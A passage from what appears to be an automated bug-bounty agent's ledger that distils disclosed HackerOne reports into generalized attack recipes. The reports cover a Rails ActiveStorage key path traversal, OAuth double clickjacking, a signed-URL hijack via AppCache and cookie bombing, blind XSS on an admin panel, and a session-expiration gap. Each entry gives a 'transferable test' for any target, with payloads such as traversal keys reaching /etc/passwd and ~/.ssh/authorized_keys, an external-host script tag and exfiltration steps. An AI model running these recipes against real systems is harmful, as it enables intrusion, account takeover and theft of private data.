DETECTION SIGNAL: a Rails app using ActiveStorage with DiskService (the default in development; used in production for small/single-server/on-prem deployments); an attach/upload endpoint whose params permit `key` (a `params.require(...).permit(:filename, :content_type, :key)`, a permissive `permit(avatar: {})`, or a nested-attribute Hash); a developer following the official guide's `key:` pattern with a dynamic value (`key: "projects/#{@project.id}/#{params[:path]}"`); a blob whose stored `key` in the DB is not the 20-char secure token. TELL: send `key: "../../../../tmp/<rand>"` (or `avatar[key]=...`) on any attach endpoint and check whether the file lands outside `storage/`; then `blob.download` reads `/etc/passwd` and `blob.purge` deletes a traversed path.
CHAIN: any authenticated user who can reach an attach/upload endpoint (primitive: a documented `key:` parameter that the Hash attachable splats into `Blob.build_after_unfurling`) -> the `has_secure_token :key` callback sees a non-blank key and SKIPS generation (primitive: a secure-token callback that is a blank-check, not a validator) -> the key is stored verbatim with no format validation (primitive: zero `validates :key`) -> `DiskService#path_for` does `File.join(root, folder_for(key), key)` with no containment check (primitive: no traversal sanitisation) -> arbitrary file write/read/delete (escalation: path traversal becomes a filesystem primitive) -> write to `/etc/cron.d/`, `~/.ssh/authorized_keys`, an application initializer, or a Puma/Unicorn restart-watched file (impact: Remote Code Execution; the report's own words: "With arbitrary file write, an attacker can achieve **Remote Code Execution** by writing to: Cron directories (`/etc/cron.d/`), SSH authorized keys (`~/.ssh/authorized_keys`), Application initializers or configuration files, Puma/Unicorn restart-watched files"). Per doctrine §8: preconditions = an attach endpoint that lets user input reach the `key:` field (the guide's own documented pattern makes this likely) and a process user with write permission on the target path; gain = arbitrary file write/read/delete on the server, escalating to RCE.
TRANSFERABLE TEST: on ANY Rails app that uses ActiveStorage with DiskService — (1) fingerprint: `bin/rails runner "puts ActiveStorage::Blob.service.class"` (or read `config/storage.yml` / `config.active_storage.service`) and look for `DiskService`; (2) find an attach/upload endpoint and capture its params — check whether `key` is permitted (a `permit(:filename, :content_type, :key)`, a permissive `permit(avatar: {})`, or a nested-attribute Hash) or whether the app builds the key from a request param (`key: "projects/#{params[:project_id]}/#{params[:path]}"`); (3) send `key: "../../../../tmp/aktiv_poc_$(date +%s)"` (or `avatar[key]=...`) with a harmless file and check the filesystem: `ls -l /tmp/aktiv_poc_*` outside `storage/` is the write; (4) persist the blob and read through its download path (or `blob.download` in a console) with `key: "../../etc/passwd"`; (5) call `blob.purge` (or the unattached-blob cleanup) with `key: "../../important_app_config.yml"` to delete. Rule: **a secure-token callback that only fills a BLANK field is not a validator, and a storage path built by `File.join(root, prefix, key)` with no containment check is traversable — the documented `key:` parameter is the injection point.**
DEDUPE: 0 hits across all three write targets for `3580511`, `DiskService`, `blob key`, `build_after_unfurling`, `path_for`, `GHSA-9xrj`, `CVE-2026-33195`, or a `key:`-parameter path traversal. Pre-existing ActiveStorage material REVIEWED and NOT re-recorded (different primitives): §17.119 / #3082917 (a cacheable blob response carrying the session `Set-Cookie` + `Cache-Control: public` -> shared-cache replay -> session-cookie theft), §17.273 / #1154034 (a user-controlled param NAME becomes the Ruby method name via `builder.send(name, *argument)` and an array param splats into an ImageMagick `convert` argv -> argument/code injection), and #407319 (a signed blob URL hijacked via AppCache + cookie stuffing). None is a path traversal through the blob `key`. Recorded as a NEW general method (a framework-level primitive that recurs in every Rails app using DiskService) -> §17.430.

SOURCE: https://hackerone.com/reports/3287060  2026-11-10
ROUTE: `web_extract` on the live HackerOne report page -> HTTP 200, full body read (the reporter's Summary, the Attack Flow, the Steps To Reproduce, the Notes, the Fix Suggestion, the Impact and the staff thread; no fallback route needed).
STATUS: UNVERIFIED (not reproduced — no WakaTime account or OAuth flow was driven this pass; every quote below is verbatim from the report).
CLASS: OAuth authorization-flow attack via DOUBLE CLICKJACKING / cross-window forgery — a logged-in victim is tricked into clicking the consent screen's Authorize button by aligning a decoy button in a SECOND top-level window, so the attacker's app receives the authorization code and exchanges it for an access token (CWE-345 / CWE-926; ATO chain).
CORE METHOD:
  1. THE SETUP, verbatim: "An attacker can trick users into unknowingly clicking the \"Connect my WakaTime account\" button in the WakaTime App consent dialog using a double-clickjacking attack. This allows an attacker to register a WakaTime OAuth App, host a phishing page, and make the victim accidentally click the Authorize button."
  2. THE AUTHORIZE URL, verbatim: `https://wakatime.com/oauth/authorize?client_id=joUNHCTnWqQ9hsmrWS5CTokR&response_type=code&redirect_uri=https://webhook.site/15495620-7c98-4643-a6df-9e7864c0dead&scope=read_orgs,write_orgs` — a standard authorization-code request whose `redirect_uri` is the attacker's collector.
  3. THE TWO WINDOWS, verbatim: "1. The attacker creates an initial webpage with a button that opens a new window (or just opens a new window without user interaction), let's say it's https://attacker.com / 2. Current tab is redirected to WakaTime OAuth Authorization URL ... / 3. At the same time, a new tab opened to https://attacker.com/attack".
  4. THE ALIGNMENT, verbatim: "Notice that the \"Double Click\" button is aligned to be the same as the \"Connect my WakaTime account\" button. If it's not aligned perfectly, just play with the positions variable in the source code. The first click will close the /attack tab, then the second click will click the \"Authorize\" button."
  5. THE PAYOFF, verbatim: "The URL gets redirected to `https://webhook.site/15495620-7c98-4643-a6df-9e7864c0dead?code=CODE`. At this point, it's up to the attacker to store the code and exchange it for access token. Now the attacker can hit the API endpoint with defined permissions. To make the victim not realize an attack happens, the attacker page can be redirected to another website after getting the code."
  6. THE PRECONDITIONS, verbatim: "The victim needs to be already logged in to WakaTime." / "The double-click button may not align perfectly, but there are ways to make the button flexible. You can adjust the position of button in `attack.html`."
  7. THE FIX SUGGESTION, verbatim: "Eliminate the risk of DoubleClickjacking by disabling critical buttons by default unless a gesture is detected (e.g., moving the mouse or using the keyboard)."
  8. THE PROGRAM'S OWN RATING, verbatim: "updated the severity from high(7.1) to medium. This requires social engineering, so it's not High severity." / "Weakness: Violation of Secure Design Principles" / "Severity Medium (4 ~ 6.9)".
DETECTION SIGNAL: an OAuth/OIDC consent screen that is reachable as a plain GET and renders an Authorize button with no user-gesture requirement; a consent page that can be opened in a NEW top-level window/tab (so `X-Frame-Options` / CSP `frame-ancestors` are irrelevant — there is no frame); an app-registration flow that lets the attacker set an arbitrary `redirect_uri` (a `webhook.site` / listener URL) and request broad scopes; a consent button that fires on a single click with no overlay guard, no gesture check and no re-auth. TELL: open the authorize URL in a new tab from an attacker page and overlay a decoy button aligned on the Authorize button — if the victim's click authorizes the attacker's app, the code lands on your `redirect_uri`.
CHAIN: an attacker with a registered OAuth app whose `redirect_uri` is a collector they control (primitive: any OAuth client registration) -> the victim is logged into the provider and lured to the attacker's page (primitive: a phishing page) -> the attacker's page opens the provider's `/oauth/authorize?...&redirect_uri=<attacker>&scope=<max>` in a new tab and a decoy page in a second tab (primitive: the consent screen is a plain GET with no frame, so `X-Frame-Options` does not apply) -> the decoy's button is aligned over the real Authorize button; the first click closes the decoy tab and the second click lands on Authorize (escalation: a UI-redressing click with no frame and no gesture check) -> the provider redirects to the attacker's `redirect_uri` with `?code=...` (escalation: the authorization code is delivered to the attacker) -> the attacker exchanges the code at the token endpoint for an access token (impact: full API access to the victim's account at the granted scopes — the report's own impact line: "The maximum permission attacker can get is all scopes as explained at https://wakatime.com/developers"; the program rated it Medium 4 ~ 6.9 and downgraded from High 7.1 for social engineering). Per doctrine §8: preconditions = the victim is logged into the provider AND clicks the decoy (a double-click); gain = an access token for the victim's account at the attacker-chosen scopes. HONESTY NOTE: doctrine §2(b) excludes "clickjacking on pages with no sensitive action" — this page HAS a sensitive action (OAuth consent), so the exclusion does not apply; the technique is recorded as an OAuth-consent delivery, not as a standalone clickjacking finding.
TRANSFERABLE TEST: on ANY OAuth/OIDC provider where you can register a client — (1) register an app with a `redirect_uri` you control (a listener / `webhook.site`) and the widest scopes; (2) build a page that `window.open`s `/oauth/authorize?client_id=<yours>&redirect_uri=<yours>&scope=<max>` in a new tab, and a second page (`/attack`) with a button absolutely positioned over the consent screen's Authorize button; (3) load the attacker page in a victim session (the victim must be logged into the provider); (4) the victim double-clicks the decoy — click 1 closes the decoy tab, click 2 hits Authorize; (5) check your `redirect_uri` listener for `?code=...`, then exchange it at the token endpoint (`POST /oauth/token` with `grant_type=authorization_code`) and call an authenticated API with the token. Rule: **a consent screen opened in a new top-level window is not protected by `X-Frame-Options` — align a decoy button in a second window so the victim's click lands on the real Authorize, and the code is delivered to your `redirect_uri`.**
DEDUPE: 0 hits across all three write targets for `3287060`, `double clickjacking`, `double-clickjacking`, `DoubleClickjacking`, `cross-window forgery`, `wakatime`, `oauth/authorize` as a clickjacking target, or an aligned-decoy-button delivery. Pre-existing OAuth/clickjacking material REVIEWED and NOT re-recorded (different mechanisms): §17.361 / #314814 (the provider's SUCCESS page `postMessage`s its own URL, which carries the `code`, to `window.opener` with `targetOrigin '*'` — an origin-unchecked postMessage leak, no clickjacking and no frame), §17.333 (SSO gadgets: `window.open` the authorize URL and read the popup's `location` for an implicit-flow token, or capture the `code` from the popup URL — a popup-URL read, not a decoy-button click), §17.160 / #434763 (the consent screen MIS-STATES the grant for the PIN/oob flow — a render-vs-mint divergence, not a UI-redressing click), §17.145 (clickjacking a headless browser's DevTools WS GUID — a frame-based clickjack on a debug channel, not a top-level-window decoy), and the oidauth entry (#326449, a framable SSO prompt page whose one required click is clickjacked). None records the double-clickjacking / cross-window-forgery mechanic (two top-level windows, an aligned decoy, no frame). Recorded as a DELTA of the OAuth-consent-attack class with a NEW DELIVERY -> §17.431.

SOURCE: https://hackerone.com/reports/3073507  2026-11-10
ROUTE: `web_extract` on the live HackerOne report page -> HTTP 200, full body read (the reporter's Summary, the Impact, the CVE/advisory/PR references and the staff thread; the first `web_extract` attempt timed out on the extract backend, the retry returned the full body; no fallback route needed). Cross-checked against the linked advisory GHSA-8863-4qmg-fr45 / CVE-2024-45033 (read in full this pass).
STATUS: UNVERIFIED (not reproduced — no Airflow instance or CLI was touched this pass; every quote below is verbatim from the report/advisory).
CLASS: insufficient session expiration via a SECOND, UNCHECKED credential-change surface — the web password-change form revokes sessions, but the admin CLI path does not, so a session stolen before the password change survives it (CWE-613).
CORE METHOD:
  1. THE TWO SURFACES, verbatim: "When a user changes his password by visiting `/resetmypassword` form, the application terminates all the existing sessions. This is to defend against the attack scenario when a user believes his account is hacked and so changes the password to ensure that he/she is the only one knowing the password in case the old password was compromised or session-id was compromised let us say using an XSS attack and then the application logs out all users making sure the attacker is also logged out and the legitimate user can safely log back in using the new password. However it has been observed that the application fails to terminate existing sessions if the password change was done by airflow cli tool."
  2. THE IMPACT, verbatim: "Account takeover possibility due to insufficient session expiration vulnerability in Apache Airflow Fab Provider."
  3. THE SCOPE, verbatim (advisory): "When user password has been changed with admin CLI, the sessions for that user have not been cleared, leading to insufficient session expiration, thus logged users could continue to be logged in even after the password was changed. This only happened when the password was changed with CLI. The problem does not happen in case change was done with webserver thus this is different from CVE-2023-40273 which was addressed in Apache-Airflow 2.7.0."
  4. THE VERSION, verbatim: "This issue affects Apache Airflow Fab Provider: before 1.5.2." (fixed in 1.5.2; PR apache/airflow#45139).
  5. THE PROGRAM'S OWN RATING, verbatim: "Internet Bug Bounty rewarded saurabhb with a bounty. This bounty was awarded with a 80/20% split. An additional $126 will be paid to the project." / "Weakness: Insufficient Session Expiration" / CVE-2024-45033.
DETECTION SIGNAL: an application with MORE THAN ONE credential-change surface — a web form (`/resetmypassword`, `/settings/security`, `/account/password`), an admin CLI (`airflow users ...`, `<tool> users reset-password`, a `--password` flag), an admin/API route, a password-reset email link, an SSO/SCIM provisioning call, or a mobile-app re-auth; a session/token that still authenticates after a password change performed on the non-web surface; an "active sessions" list that still shows the old session. TELL: change the password through the CLI/admin surface, then replay the session cookie captured before the change — if it still returns 200 with the account, that surface did not revoke.
CHAIN: an attacker who holds a stolen session id / session cookie (primitive: a session stolen via XSS, a shared device, a log line, a proxy) -> the legitimate user (or an admin) changes the password through the ADMIN CLI, believing this evicts the attacker (primitive: the user's mental model is "password change logs everyone out") -> the CLI path does not clear the user's sessions while the web `/resetmypassword` path does (primitive: a second credential-change surface with no session revocation) -> the attacker's stolen session keeps authenticating after the password change (escalation: the remediation the victim performed is a no-op against the attacker) -> the attacker retains authenticated access indefinitely (impact: account takeover that survives the victim's own recovery action; the report's own words: "Account takeover possibility due to insufficient session expiration"). Per doctrine §8: preconditions = a session/token stolen BEFORE the password change (the doctrine §2(b) "no demonstrated impact" bar is escaped because the chain reaches ATO), and the password change performed on the CLI/admin surface; gain = the stolen session continues to authenticate after the password change. HONESTY NOTE: on its own this presumes prior credential compromise, so it is recorded as a chain link / auth-lifecycle technique, not as a standalone unauthenticated finding.
TRANSFERABLE TEST: on ANY application with more than one credential-change surface — (1) enumerate every way to change a password: the web form, the admin CLI, the admin/API route, the password-reset email link, the SSO/SCIM provisioning call, and the mobile app's re-auth; (2) capture a valid session cookie/token at T0; (3) change the password through EACH surface in turn (on a test account you own); (4) after each change, replay the T0 cookie/token against an authenticated endpoint (`/me`, `/api/v1/users/current`, `/account`) — a 200 with the account means THAT surface did not revoke; (5) also check whether the new password itself works and whether the old one is dead (to confirm the change actually happened). Rule: **session invalidation must be tested on EVERY credential-change surface — the admin CLI/API path is the one that skips it.**
DEDUPE: 0 hits across all three write targets for `3073507`, `Airflow Fab`, `GHSA-8863`, `CVE-2024-45033`, or a differential session-invalidation-across-password-change-surfaces test. Pre-existing session-lifecycle material REVIEWED and NOT re-recorded (different mechanisms): #1547684 (Shopify, "Disconnecting an external login provider does not revoke session" — the UNLINK action does not revoke the sessions the provider minted and the provider can be RE-LINKED; a removal that does not revoke, not a credential-change surface that does not revoke), §17.394 / #1172205 (a revoke endpoint that requires a "logout token hint" the shipped client omits, so logout is a no-op — a broken REVOKE ENDPOINT, not a second password-change surface), §17.332 (PostHog, a re-auth flow bypassed by dropping the request that validates the password — a request-dropping bypass, not a session-invalidation gap), the Dovetale #1652046 entry (unlinking an external provider does not invalidate the sessions it minted), and the Intercom teardown note. None records the DIFFERENTIAL: the same app has two password-change paths, one revokes and one does not. Recorded as a DELTA of the insufficient-session-expiration class with a NEW ENTRY POINT (the admin CLI) and a NEW TEST (diff every credential-change surface) -> §17.432.

NOTE — reader pass 2026-11-10 batch 140 (6 assigned sources read ONE BY ONE in the given order; 3 entries appended to the harvest ledger `/root/bugbountyhuntingskills.md` and the dated knowledge file `/root/hackbot-architecture/knowledge/methodologies-2026-11-10.md`; 3 new §17 slots). NEW: (1) HackerOne #3580511 (Ruby on Rails, "ActiveStorage Disk Service Path Traversal via Custom Blob Key Injection", reporter ksw9722, submitted 2026-03-02, resolved 2026-04-07, disclosed 2026-05-07, Medium 6.5, weakness Path Traversal, CVE-2026-33195 / GHSA-9xrj-h377-fr87) — the documented `key:` parameter is splatted through the Hash attachable into `Blob.build_after_unfurling`, the `has_secure_token :key` callback only generates a token when the attribute is BLANK, `ActiveStorage::Blob` has zero `validates :key`, and `DiskService#path_for` does `File.join(root, folder_for(key), key)` with no containment check -> arbitrary file write/read/delete -> RCE via `/etc/cron.d/`, `~/.ssh/authorized_keys`, or a restart-watched file; NEW general method -> §17.430. (2) HackerOne #3287060 (WakaTime, "Double Clickjacking Attack on WakaTime OAuth Authorization Flow at https://wakatime.com/oauth/authorize", reporter zeesozee, submitted 2025-08-05, resolved/disclosed 2025-08-05, Medium 4 ~ 6.9, weakness Violation of Secure Design Principles) — a logged-in victim is tricked into clicking the consent screen's Authorize button by aligning a decoy button in a SECOND top-level window, so the attacker's app receives the `code` at its own `redirect_uri` and exchanges it for an access token; DELTA of the OAuth-consent-attack class with a NEW DELIVERY (double clickjacking / cross-window forgery — no frame, so `X-Frame-Options` is irrelevant) -> §17.431. (3) HackerOne #3073507 (Internet Bug Bounty, "Apache Airflow Fab Provider: Application does not invalidate session after password change via Airflow cli", reporter saurabhb, submitted 2025-04-02, resolved 2025-04-27, disclosed 2025-05-29, bounty, weakness Insufficient Session Expiration, CVE-2024-45033 / GHSA-8863-4qmg-fr45) — the web `/resetmypassword` form revokes all sessions but the admin CLI password change does not, so a session stolen before the change survives it; DELTA of the insufficient-session-expiration class with a NEW ENTRY POINT (the admin CLI) and a NEW TEST (diff every credential-change surface) -> §17.432. VALID-BUT-NOT-RECORDED (no entry, nothing invented): HackerOne #3591956 (curl, "Use-After-Free in SMB connection reuse (req->path dangling pointer after needle destruction)", reporter nadsec42, submitted 2026-03-08, disclosed 2026-04-29, High 7 ~ 8.9, weakness Use After Free, marked Duplicate by curl) — a real, readable report with a full ASAN trace: `smb_parse_url_path()` sets `req->path` as a non-owning pointer into `smbc->share`, and on connection reuse `Curl_conn_free()` -> `smb_conn_dtor()` frees `smbc->share` while `req->path` still references it, so `strlen(req->path)` in `smb_send_open()` reads freed heap. NOT RECORDED because memory corruption is outside the doctrine §1 reportable classes (the ledger's own batch notes state "bare memory corruption is not a §1 class" and "memory-corruption depth is LAB-ONLY") and the report's impact is a client-side crash (DoS), which doctrine §2(d) marks ineligible; the report claims only "could potentially lead to information disclosure or further memory corruption" with no demonstrated escalation. HackerOne #3114132 (WakaTime, "Broken Access Control Exposes Email Verification Status and Privacy Settings via API Endpoint", reporter ctrl_cipher, submitted 2025-04-26, resolved 2025-04-29, Low 0.1 ~ 3.9, weakness Improper Access Control - Generic) — `GET /api/v1/users/{username}` returns `is_email_confirmed` / `is_email_public` for any username; the program ruled it intended behavior ("the users made their email public even to non-authenticated users. However, we've made it only visible to users who are logged in now") and downgraded it to Low; an info-disclosure/existence oracle with NO documented chain, so per the CHAIN-ONLY rule it is held as a lead, not an entry. INVALID (no entry, nothing invented): HackerOne #2844797 (IBM, "Exposed Logs and Bearer Tokens on Test Endpoint", reporter facades, submitted 2024-11-15, resolved 2024-12-04, disclosed 2024-12-12) — the live page, `r.jina.ai`, the browser tool and the Wayback capture all return only IBM's disclosure summary and an empty timeline; there is no reporter text, no endpoint, no request and no technique, so nothing can be extracted or invented. 6 sources read, 0 fabricated. Full per-source route/honesty records are in the harvest ledger `/root/bugbountyhuntingskills.md` and `/root/hackbot-architecture/knowledge/methodologies-2026-11-10.md`.

SOURCE: https://hackerone.com/reports/403602  2026-11-10
ROUTE: `web_extract` on the live HackerOne report page -> HTTP 200, full body read (the reporter's Summary, the signed bucket URL, the three uploaded PoC files, the reproduction steps, the PoC and the Impact; no fallback route needed). Cross-checked against the Detectify Labs article the report itself names as the source of the trick (https://labs.detectify.com/2018/08/02/bypassing-exploiting-bucket-upload-policies-signed-urls/).
STATUS: UNVERIFIED (not reproduced — no GCS bucket or Rails app was touched this pass; every quote below is verbatim from the report).
CLASS: business-logic / authorization — a signed-URL object-storage bucket whose `response-content-type` and `response-content-disposition` parameters are NOT covered by the signature, combined with AppCache FALLBACK + cookie bombing, so an attacker who can upload to the bucket hijacks every signed URL in it (CWE-345 / CWE-639 -> CWE-200 / CWE-287).
CORE METHOD:
  1. THE SETUP, verbatim: "Basecamp attachments are stored in the `bc3_production_blobs` bucket in the root directory and can be served with `text/html` content-type." The signed URL shape is `https://storage.googleapis.com/bc3_production_blobs/*key*?GoogleAccessId=bc3-production-storage%40bc3-production.iam.gserviceaccount.com&Expires=1535826443&Signature=*sign*&response-content-type=text/html` — the `response-content-type` (and `response-content-disposition`) override parameters are appended to the signed URL but are NOT part of the signed query set, so the signature still validates while the attacker changes how the object is served.
  2. THE BYPASS, verbatim: "So with AppCache+CookieBombing trick an attacker can upload html file and if the user visit url of this file then all further uploads to this bucket and downloads from it will be hijacked by an attacker."
  3. THE UPLOAD, verbatim (reproduction steps): "1. Login to 3.basecamp.com / 2. Open campfire of any project / 3. Upload target files / 4. Extract direct links of them to Google Storage and remove `response-content-disposition` param."
  4. THE THREE FILES, verbatim: (a) `main.html` = `<html manifest="[manifest_url]">` + `<script>setTimeout(function(){for(var i = 1e3; i>0; i--){document.cookie = i + '=' + Array(4e3).join('0') + '; path=/';}}, 3000);</script>` (1000 cookies x 4 KB = a Cookie-header overflow); (b) `manifest.appcache` = `CACHE MANIFEST` / `FALLBACK:` / `/bc3_production_blobs/ [fallback_url]`; (c) `fallback.html` = `<script>alert('Your request to the page '+location.href+' is hijacked!')</script>`.
  5. THE TRIGGER, verbatim: "Go to http://████████/bc3attach and then try to open any direct link of `bc3_production_blobs` bucket. You will see alert popup with full url of this file."
  6. THE MECHANISM (from the Detectify article the report links): the cookie-bombing script overflows the `Cookie` header on every request to the bucket host, so the storage service returns an error; the browser reads the error as "offline" and serves the AppCache `FALLBACK` entry, which is the attacker's `fallback.html`; that page's JS reads `location.href` (the victim's signed URL) and sends it to the attacker.
  7. THE IMPACT, verbatim: "Direct links to any attachments can be hijacked and confedential files can be compromised."
DETECTION SIGNAL: an object-storage bucket (GCS `storage.googleapis.com/<bucket>/`, S3, Azure) whose signed/delegate URLs carry `response-content-type=` / `response-content-disposition=` (or `response-cache-control=`) as QUERY parameters; a signature that still validates when those params are changed or removed; an upload flow that returns a signed URL whose key/path the attacker can choose (so an HTML file can be planted at a predictable prefix); one bucket serving a whole application's attachments under a single path prefix. TELL: take a legit signed URL, set `response-content-type=text/html` and DELETE `response-content-disposition`, and fetch it — if it renders inline as HTML, the presentation params are unsigned.
CHAIN: any authenticated user who can upload to the bucket (primitive: an ordinary upload) -> the bucket serves attacker HTML inline because the content-type/disposition params are outside the signature (primitive: a signed URL whose presentation parameters are not signed) -> the attacker plants `main.html` (cookie bomber), `manifest.appcache` (`FALLBACK` for the bucket prefix) and `fallback.html` (the hijack page) -> a victim opens the attacker's page (escalation: a UI-delivery step) -> the victim's browser bombs the bucket host with cookies, the bucket errors, AppCache serves the attacker's FALLBACK (escalation: the bucket's own error is turned into a fallback render) -> the attacker's JS reads `location.href` = the victim's signed URL for any object in the bucket (escalation: the signed URL is the only credential needed) -> the attacker replays that signed URL to read the private object (impact: access to confidential attachments / private objects across the bucket; the Rails twin #407319 states the impact as "Gain access to signed URLs for private objects, which in practice means access to those objects, as signed URLs is all that is needed"). Per doctrine §8: preconditions = an upload primitive on the bucket AND a victim who opens the attacker's page in a browser that still supports AppCache; gain = the victim's signed URLs for the bucket and therefore the private objects they address. FRESHNESS CAVEAT: the AppCache delivery is browser-deprecated (Chrome removed AppCache in 2020), so the durable, still-testable primitive is the UNSIGNED presentation parameters on the signed URL — a configuration property of the bucket/service, not of the browser.
TRANSFERABLE TEST: on ANY target that hands the client a signed URL into an object-storage bucket — (1) capture a legit signed URL and list its query parameters; (2) change `response-content-type` to `text/html` (or `text/cache-manifest`) and DELETE `response-content-disposition`, then fetch the URL with the file extension unchanged: if the response renders inline as HTML, the signature does not cover the presentation params (the primitive); (3) confirm the upload flow lets the attacker choose the object key/path (so an HTML file can be planted at a predictable prefix) and that the bucket serves many users' objects under one prefix; (4) if the target's browsers still support AppCache (legacy/embedded WebViews, internal tools), build the three-file chain — `main.html` with the cookie-bombing loop, `manifest.appcache` with `FALLBACK: /<bucket-prefix>/ <fallback.html>`, `fallback.html` with a `location.href` exfil — and have a victim open `main.html`; (5) the durable test is step 2 alone: an unsigned content-type/disposition override that makes a private file render inline in the app origin is a stored-XSS/phishing primitive even without AppCache. Rule: **a signed URL's signature must cover every parameter that changes how the object is served — if `response-content-type`/`response-content-disposition` are outside the signature, the attacker controls the presentation of every object in the bucket, and the AppCache-FALLBACK + cookie-bombing chain turns that into a signed-URL hijack.**
DEDUPE: 0 hits across all three write targets for `403602`, `AppCache`, `appcache`, `cookie bombing`, `cookie stuffing`, `manifest.appcache`, `fallback.html`, `bc3_production_blobs`, `response-content-type` (as an unsigned signed-URL parameter), or a signed-URL hijack. IMPORTANT CORRECTION: the batch-139 dedupe note refers to "#407319 (a signed blob URL hijacked via AppCache + cookie stuffing)" as "pre-existing material", but #407319 is NOT present in any write target — it is an UNREAD source still sitting in `/root/hackbot-architecture/state/report-queue.txt` (line 4888, class INTERNAL-FILE-READ, Ruby on Rails). The technique was therefore never actually recorded; this entry is its first record, taken from the assigned source #403602. Pre-existing object-storage material REVIEWED and NOT re-recorded (different primitives): §17.275 / #22733 (a signed S3 POST POLICY scoped by a prefix — an outbound upload-policy SCOPE bug, not a presentation-parameter tamper on a download URL), §17.212 / #2337427 (a presigned-URL VALIDATOR that fail-opens on the expiry branch — an inbound validation bug, not unsigned presentation params), §17.328 / #452559 (an unauthenticated PUT to a CDN gated only by Content-Type — an upload gate, not a signed-URL hijack). Recorded as a NEW general method -> §17.433.

SOURCE: https://hackerone.com/reports/1339034  2026-11-10
ROUTE: `web_extract` on the live HackerOne report page -> HTTP 200, full body read (Summary, Steps To Reproduce, Supporting Material, Credentials, Impact; no fallback route needed). Cross-checked against the local disclosed-reports mirror `/tmp/h1_train.parquet` (row id 1339034, `visibility: full`, `vulnerability_information` 1,819 B) — identical text.
STATUS: UNVERIFIED (not reproduced — no Judge.me store or admin panel was touched this pass; every quote below is verbatim from the report).
CLASS: stored/blind XSS in an ADMIN-VISIBLE surface reached through a post-onboarding feedback form — with the impact nuance that an HTTP-Basic-Auth-protected admin panel blocks cookie theft but NOT content exfiltration (CWE-79 -> CWE-200).
CORE METHOD:
  1. THE ENTRY POINT, verbatim: "I was trying to add widgets on the installation page for default theme. When the installation was done, I saw a question like that Are you happy with how everything looks?. I clicked the No, please remove all widgets button and then the feedback form arrives. I submitted my blind XSS payload."
  2. THE STEPS, verbatim: "1. Go to https://odo-tester.myshopify.com/admin/ and login with the test credentials. / 2. Click the Apps tab from the left side and then click Judge.me Product Reviews. / 3. Click Add Widgets then Start Installation and continue. / 4. When the installation is done. It asks Are you happy with how everything looks?. Choose No, please remove all widgets button. Feedback form appears and put your blind xss payload. / 5. Wait for payload triggering."
  3. THE PAYLOAD, verbatim: `"><script src=https://yourxssdomain></script>`.
  4. THE SINK, verbatim: "It triggered in 20-30 minutes on https://judge.me/admin which requires the HTTP Basic Authentication. I can't get the admin session cookie but I can collect all of the admin pages."
  5. THE IMPACT, verbatim: "Blind XSS leads to access to the admin panel. It may contain information leaks about other shop owners' reports. Executes javascript code on admin panel. Stealing admin cookies."
DETECTION SIGNAL: a post-onboarding / post-installation feedback form (a "Are you happy with how everything looks?" widget-removal prompt, an in-app NPS/survey, a "remove all widgets" confirmation) whose submission is stored and rendered on the vendor's admin panel; an admin panel protected by HTTP Basic Authentication rather than a session cookie; a blind-XSS hit on an `/admin` path. TELL: the payload fires on `/admin` and the reporter's own note that the session cookie is NOT obtainable but the admin PAGES are — that asymmetry is the Basic-Auth tell.
CHAIN: any store owner who can install the app and dismiss the widget prompt (primitive: an ordinary authenticated user) -> the feedback form's free-text field is stored and rendered unescaped on the vendor's admin panel (primitive: an admin-visible surface populated from user input) -> the payload executes in the admin's browser on the app origin (escalation: script with the admin's origin) -> because the panel is behind HTTP Basic Auth, the session cookie is not the auth material, but the browser auto-attaches the cached Basic credentials to every same-origin XHR (escalation: the injected script can read the admin panel's own pages and exfiltrate them) -> admin-panel content and cross-shop report data are readable by the attacker (impact: the report's own words — "access to the admin panel ... information leaks about other shop owners' reports"; program-rated High 8.0). Per doctrine §8: preconditions = an ordinary store account able to reach the post-installation feedback form AND an admin who opens the admin panel after the payload is stored; gain = admin-panel content (and any cross-tenant data the panel shows), not the session cookie.
TRANSFERABLE TEST: on ANY app that shows a feedback/survey/NPS form during onboarding or after a setup step — (1) submit a blind-XSS payload (`"><script src=https://yourxssdomain></script>`) in every free-text field of that form; (2) wait for the admin to open the surface it renders on (check your blind-XSS dashboard for a hit on an `/admin` path); (3) if the sink is an admin panel behind HTTP Basic Auth, do NOT plan on cookie theft — instead have the payload XHR the panel's own same-origin endpoints (`fetch('/admin/...', {credentials:'include'})`) and exfiltrate the response bodies, because the browser attaches the cached Basic credentials automatically; (4) check whether the panel shows OTHER tenants' data (cross-shop/cross-customer reports) — that is the P2-grade impact. Rule: **a feedback form shown during onboarding is an admin-visible stored-XSS sink; when the admin panel uses HTTP Basic Auth the impact is full admin-content exfiltration via same-origin XHR (credentials auto-attached), not cookie theft.**
DEDUPE: 0 hits across all three write targets for `1339034`, `judge.me`, `judgeme`, a post-onboarding widget-removal feedback form as an XSS carrier, or an HTTP-Basic-Auth admin panel as the XSS impact modifier. Pre-existing material REVIEWED and NOT re-recorded (different sink/carrier): §17.106 / #127948 (an admin-visible ACTIVITY/AUDIT LOG poisoned by an UNAUTHENTICATED request header -> admin XSS -> theme/plugin editor -> RCE — the sink is a log writer keyed on request metadata, not a feedback form; and its chain ends in RCE via the CMS editor, not in admin-content exfil), the ledger's NAME-field carrier variant (~line 5023: a tenant-authored NAME rendered in vendor-internal tooling) and #391390 (a member NAME -> admin activity row), V-05 (generic blind-XSS tracking), and the docs-host DETECTION SIGNAL at ~line 3193 that names a "'feedback'/'ticket' flow where the author is unprivileged and the reader is staff/admin" (a template-injection surface, not a stored-XSS carrier). DELTA here = the ENTRY POINT (a post-installation "remove all widgets" feedback form) and the IMPACT MODIFIER (HTTP Basic Auth blocks cookie theft but not same-origin content exfiltration). Recorded as a DELTA of the admin-visible-XSS class, NO new §17 slot.

